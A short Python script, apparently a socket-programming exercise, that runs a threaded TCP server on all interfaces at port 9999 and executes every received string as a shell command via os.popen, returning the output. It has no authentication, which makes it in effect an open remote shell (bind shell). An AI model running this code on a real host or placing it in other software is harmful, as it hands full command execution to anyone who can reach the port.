import socket, os, threading, time

def tcplink(conn, addr):
    print('Accept new connection from {} ...'.format(addr))
    data = conn.recv(1024)
    print('recv', data.decode())
    conn.send(b'ack recv')
    #   time.sleep(0.5)
    cmd = os.popen(data.decode()).read()
    conn.send(cmd.encode('utf-8'))
    conn.close()
    print('Connection from {} closed'.format(addr))


server = socket.socket()
server.bind(('0.0.0.0', 9999))
server.listen()
while True:
    conn, addr = server.accept()
    t = threading.Thread(target=tcplink, args=(conn, addr))
    t.start()
server.close()